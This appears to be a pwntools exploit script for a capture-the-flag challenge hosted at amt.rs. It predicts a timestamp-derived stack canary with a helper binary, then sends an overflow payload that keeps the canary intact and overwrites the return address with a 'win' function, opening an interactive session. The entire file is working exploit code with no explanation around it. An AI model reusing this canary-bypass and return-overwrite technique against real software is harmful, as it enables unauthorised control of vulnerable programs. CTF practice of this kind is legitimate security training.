from pwn import *

elf = ELF('./chal', checksec=False)

gen = ELF('./gen', checksec=False)

"""
canary was calculated via the timestamp so the program gen generates the cookie (will upload it later)
"""

def get_canary_leak():
    global leak
    r = process(gen.path)
    return r.recvline().strip()

#p = process(elf.path)
p = remote(b"amt.rs",31175)

p.recvuntil(b"Please")

leak = get_canary_leak()
leak = int(leak, 0)
info("Canary %s" % hex(leak))

p.recvuntil(b"Exit\n")
p.sendline(b"2")

p.recvuntil(b": ")

payload = b"A"*44
payload += p64(leak)
payload += b"A"*4
payload += p64(elf.sym['win'])

p.sendline(payload)
p.interactive()
